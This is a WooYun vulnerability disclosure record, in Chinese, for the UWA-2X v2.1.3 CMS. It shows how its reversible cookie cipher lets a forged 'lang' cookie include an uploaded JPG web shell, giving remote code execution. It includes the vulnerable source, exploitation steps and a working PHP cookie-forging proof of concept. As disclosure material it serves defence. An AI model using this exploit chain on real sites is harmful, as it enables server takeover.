{"id": 50762, "wybug_id": "wooyun-2014-076892", "wybug_title": "UWA-2X(v2.1.3) 某函数缺陷导致的 前台无限制getshell", "wybug_corp": "asthis.net", "wybug_author": "roker", "wybug_date": "2014-09-23 12:29", "wybug_open_date": "2014-12-22 12:30", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向公众公开  简要描述： 看到有人在360库带提交了这个程序的漏洞。最新版下来看看，表示还是喜欢提交乌云 :) 详细说明：  漏洞出现在cookie加密函数\npublic static function encrypt($txt, $key = '') {\t\t$encrypt_key = md5(mt_rand(0, 32000));\t\t$ctr = 0;\t\t$tmp = '';\t\tfor($i = 0; $i < strlen($txt); $i++) {\t\t\t$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;\t\t\t$tmp .= $encrypt_key[$ctr] . ($txt[$i] ^ $encrypt_key[$ctr++]);\t\t}\t\treturn base64_encode(self::_crypt($tmp, $key));\t}\tpublic static function decrypt($txt, $key = '') {\t\t$txt = self::_crypt(base64_decode($txt), $key);\t\t$tmp = '';\t\tfor($i = 0; $i < strlen($txt); $i++) {\t\t\t$md5 = $txt[$i];\t\t\t$tmp .= $txt[++$i] ^ $md5;\t\t}\t\treturn $tmp;\t}\tprivate static function _crypt($txt, $encrypt_key) {\t\t$encrypt_key = md5($encrypt_key);\t\t$ctr = 0;\t\t$tmp = '';\t\tfor($i = 0; $i < strlen($txt); $i++) {\t\t\t$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;\t\t\t$tmp .= $txt[$i] ^ $encrypt_key[$ctr++];\t\t}\t\treturn $tmp;\t}\n咋和dede的一样呢。。。 WooYun: DedeCMS-V5.7-SP1(2014-07-25)sql注入+新绕过思路 这个加密算法我逆向过，，就不多说了。。。因为这个可以逆所以我们可以控制cookie。接下来就是getshell了看到/core/lib/core/App.class.php\nprivate static function load_lang() {\t\t$langSet = C('LANG.NAME');\t\t/* detect language */\t\tif(C('LANG.DETECT')) {\t\t\t$_t_l = ARequest::get(C('VAR.LANG'));\t\t\tif(!empty($_t_l)) {\t\t\t\t$langSet = strtolower(ARequest::get(C('VAR.LANG')));\t\t\t\tACookie::set('lang', $langSet);\t\t\t}\t\t\telseif(ACookie::get('lang')) {\t\t\t\t$langSet = ACookie::get('lang');\t\t\t}\t\t\telseif(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {\t\t\t\tpreg_match('/^([a-z\\-]+)/i', $_SERVER['HTTP_ACCEPT_LANGUAGE'], $matches);\t\t\t\t$langSet = strtolower($matches[1]);\t\t\t\tACookie::set('lang', $langSet);\t\t\t}\t\t}\t\tdefine('LANG_SET', strtolower($langSet));\t\t/* load framework language */\t\tif(is_file(PFA_PATH . '/lang/' . LANG_SET . '.lang.php')) {\t\t\tL(include PFA_PATH . '/lang/' . LANG_SET . '.lang.php');\t\t}\t\telseif(is_file(PFA_PATH . '/lang/' . C('LANG.NAME') . '.lang.php')) {\t\t\tL(include PFA_PATH . '/lang/' . C('LANG.NAME') . '.lang.php');\t\t}\nACookie::set('lang', $langSet);接收lang的cookie后 再包含。 我们可以上传个jpg格式的shell再截断包含，因为数据是加密再解密进入的，所以无视gpc的影响~-------------------利用过程，首先注册个长度为24的账户，这样才能完美的控制cookie的值，\n\n上传个jpg格式的shell\n\n记住地址后，看下cookie uwa_m_userid的值。他的明文对应格式为 \ns:长度:\"账户名\";\n将得到的值填入下面的poc\n<?phpfunction cracked($Expressly,$Ciphertext,$str,$way){$Ciphertext = base64_decode($Ciphertext);if ($way==\"descrypt\"){$text2=\"\";$str=base64_decode($str);}else{$text2=\"a\";}$j=0;$s=0;for($i=0;$i<strlen($str);$i++,$s++){if($j==32){$j=0;$s=0;}$tmp=$Ciphertext[$j]^$Ciphertext[$j+1];$tmp=$tmp^$Expressly[$s];$tmp=$tmp^$str[$i];if ($way==\"descrypt\"){$text1=$tmp^$str[++$i];}else{$text1=$tmp^$text2;}$xxoo =$xxoo.$text2.$text1;$j=$j+2;}if ($way==\"descrypt\"){echo $xxoo;}else{echo base64_encode($xxoo);}}$a=$_GET['a'];$a=serialize($a);cracked(\"s:24:\\\"a11111111111111111111111\\\";\",\"U3pRPFA/VjMHaVMsW2BWNVFlVTJWZQU1CDxZMVNgXWdUP1YwUDwHZ1QxA28OZVQ3DTlWMVVmUmJVYQxkV3ddbQ==\",$a,\"encrypt\"); ?>\n得到最终的playload\n\n\npoc需在gpc关闭的情况下运行。目标站开不开gpc就无所谓了，因为数据是加密再解密进入的，所以无视gpc的影响~\n修改cookie值， 可以看到成功执行了php脚本\n\n   漏洞证明：  如上所述   修复方案：  换个算法。或者过滤下解密后的值   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-09-23 13:11 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-23 12:43 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  小厂商？感觉不应该啊    \n     2014-09-23 12:48 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @menmen519 = =。 不开心    \n     2014-10-11 12:08 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @roker 大牛就是不一样    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}